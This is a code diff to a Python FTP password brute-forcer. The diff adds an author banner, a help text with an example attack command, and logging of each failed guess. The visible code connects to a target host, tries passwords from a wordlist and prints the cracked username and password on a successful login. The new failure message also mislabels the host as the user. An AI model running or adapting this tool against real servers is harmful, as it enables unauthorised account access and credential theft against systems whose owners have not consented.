@@ -3,6 +3,48 @@ import socket
 import argparse
 from sys import exit
 
+def banner():
+    banner = '''
+    
+                                _,-----.
+                  _,------.__,-'        `.  .            .
+               .-'                        `//__          \\
+              |                           ((___`-_____    ))
+              |                            \_alf)     \`=:'
+              |                               `=|      |=,'
+             /                                  | O   (|
+            /  /\                               |      |
+           /  /  \    .                          \     |
+          |  /   /|  / `--.   ___            __,,-.    |
+          | /   //  /      `-'   \  ,_    /''     |  o o|
+         / |   | |  |             \ \ `.  |        ``--'
+         mmm   | |  |              \ \ |  |
+               | |\ |              |  ||  |
+               | | ||              / / `. )
+                \ \ \\            / /   | |
+                 |_| ||          / /    | |
+                     |_\         \_|    |  \\
+                                         \__\\
+
+    Author: Gabriel Dutra a.k.a CoolR00t
+    email: gabrieldmdutra@gmail.com
+    linkedin: linkedin.com/in/gmdutra
+    '''    
+
+    print(banner)
+
+
+help_message = '''
+    Arguments:
+        --host      target
+        --user      user, default is root
+        --wordlist  wordlist used for the attack
+
+    Example:
+        python mporheus.py --user root --wordlist wordlist.txt --threads 3
+
+'''
+
 class BruteFTB(object):
     def __init__(self, host, user, wordlist):
         self.user = user
@@ -27,33 +69,37 @@ class BruteFTB(object):
                 sc.send("QUIT\r\n")
 
                 if "230 Login successful" in r:
+                    print("\n\n")
                     print("----------Successful----------")
                     print("Target: {0}".format(self.host))
                     print("Username: {0}".format(self.user))
                     print("Password: {0}".format(line.strip()))
                     print("------------------------------")
                     exit(0)
+            
+                print("User: {0} Password: {1} - FAILED".format(self.host, line.strip()))
 
 def main():
 
-    parser = argparse.ArgumentParser(add_help=False)
+    parser = argparse.ArgumentParser(add_help=False, usage=help_message)
     parser.add_argument('--host',     action="store", dest="host",\
-                          required=True)
+                            required=True)
    
     parser.add_argument("--user",     action="store", dest="user",\
-                          required=True)
+                            required=True)
    
     parser.add_argument("--wordlist", action="store", dest="wordlist",\
-                          required=True)
+                            required=True)
 
     given_args = parser.parse_args()
 
-    host     = given_args.host
-    user     = given_args.user
-    wordlist = given_args.wordlist
+    host        = given_args.host
+    user        = given_args.user
+    wordlist    = given_args.wordlist
 
     FTP = BruteFTB(host, user, wordlist)
     FTP.Checkout()
 
 if __name__=='__main__':
+    banner()
     main()
